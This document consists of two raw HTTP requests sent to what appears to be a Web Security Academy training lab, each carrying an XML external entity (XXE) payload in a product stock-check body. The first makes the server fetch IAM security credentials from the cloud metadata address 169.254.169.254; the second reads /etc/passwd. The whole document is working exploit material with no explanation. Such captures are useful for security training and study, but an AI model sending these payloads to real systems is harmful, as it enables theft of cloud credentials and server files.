```
POST /product/stock HTTP/2
Host: 0ac0004404b7d67c81692b8b00d800a5.web-security-academy.net
Cookie: session=PXpCi8nnluLbWnJkJNlBrKZdGIdCVjm1
Content-Length: 240
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Content-Type: application/xml
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: */*
Origin: https://0ac0004404b7d67c81692b8b00d800a5.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ac0004404b7d67c81692b8b00d800a5.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE attack [<!ENTITY payload SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
<stockCheck>
<productId>&payload;
</productId><storeId>1</storeId></stockCheck>
```

```
POST /product/stock HTTP/2
Host: 0ac0004404b7d67c81692b8b00d800a5.web-security-academy.net
Cookie: session=PXpCi8nnluLbWnJkJNlBrKZdGIdCVjm1
Content-Length: 240
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Content-Type: application/xml
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: */*
Origin: https://0ac0004404b7d67c81692b8b00d800a5.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ac0004404b7d67c81692b8b00d800a5.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE attack [<!ENTITY payload SYSTEM "file:///etc/passwd">]>
<stockCheck>
<productId>&payload;
</productId><storeId>1</storeId></stockCheck>
```
